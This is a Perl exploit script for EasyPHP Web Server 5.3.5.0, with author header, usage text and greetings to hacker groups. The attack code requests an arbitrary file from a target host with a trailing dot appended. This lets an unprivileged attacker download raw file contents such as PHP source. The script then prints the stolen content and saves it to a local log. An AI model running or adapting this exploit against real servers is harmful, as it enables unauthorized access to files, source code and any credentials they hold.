#!/usr/bin/perl
# ********* In The name of Allah ************
###
# Title : EasyPHP Web Server 5.3.5.0 Remote File Download Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Remote Content/Download File
# Tested on : Windows XP SP3 Fran�ais 
# Target : EasyPHP 5.3.5.0
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# EasyPHP Web Server is vulnerable for a Remote File Download attcak, the following code will exploit the bug.
# The vulnerability allows an unprivileged attacker to download files whom he has no permissions to.
# ------------
# ********* In The name of Allah ************
system("title KedAns-Dz");
system("color 1e");
system("cls");
sleep(1);
# Start Exploit : **  Allah Akbar ** 
use LWP::Simple;
if (@ARGV < 3) {
print("\r\n");
print("=================================================================\r\n");
print("  [*] EasyPHP Web Server 5.3.5.0 Remote File Download Exploit\r\n");
print("  [*] Discovered & Exploited by : KedAns-Dz\r\n");
print("=================================================================\r\n");
print("  [!] Usage: " .$0. " <host> <port> <file>\r\n");
print("  [!] HOST - An host using EasyPHP Web Server\r\n");
print("  [!] PORT - Port number\r\n");
print("  [!] FILE - The file you want to get\r\n");
print("  [!] Example: " .$0. " targetserver.com 80 index.php\r\n");
print("=================================================================\r\n\r\n");
sleep(1);
exit(1);
# **  Allah Akbar ** 
} else {
print("=================================================================\n");
print("  [*] EasyPHP Web Server 5.3.5.0 Remote File Download Exploit\r\n");
print("  [*] Discovered & Exploited by : KedAns-Dz\r\n");
print("=================================================================\r\n\r\n");
sleep(2);
($host, $port, $file) = @ARGV;
$content = get("http://" .$host. ":" .$port. "/" .$file. ".");
print(" [+] File Content:\r\n\r\n");
sleep(2);
print($content. "\r\n");
open (KDZ ,">","KedAns.log");
print KDZ "Log File Exploited By KedAns-Dz <ked-h(at)hotmail(dot)com>\r\n" .
          "Greets All Hackers Moslems & All My Friends \r\n" .
          "Target : http://$host:$port/$file \r\n" .
		  "File Content : \n\n" .
		  "=============================\r\n\n" .
		  "$content";
print("\r\n");
print("=================================================================\n");
print "\n[+++] Creating And Download the Target File Content in KedAns.log \n";
}
# ** In The Peace of Allah **
#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Islampard * Zaki.Eng * Dr.Ride * Red1One * Badr0 * XoreR * Nor0 FouinY * Hani * Mr.Dak007 * Fox-Dz
# Masimovic * TOnyXED * cr4wl3r (Inj3ct0r.com) * TeX (hotturks.org) * KelvinX (kelvinx.net) * Dos-Dz
# Nayla Festa * all (sec4ever.com) Members * PLATEN (Pentesters.ir) * Gamoscu (www.1923turk.com)
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Indoushka (Inj3ct0r.com) * [ Ma3sTr0-Dz * MadjiX * BrOx-Dz * JaGo-Dz (sec4ever.com) ] * Dr.0rYX 
# Cr3w-DZ * His0k4 * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# www.packetstormsecurity.org * exploit-db.com * bugsearch.net * 1337day.com * exploit-id.com 
# www.metasploit.com * www.securityreason.com * All Security and Exploits Webs ...
#================================================================================================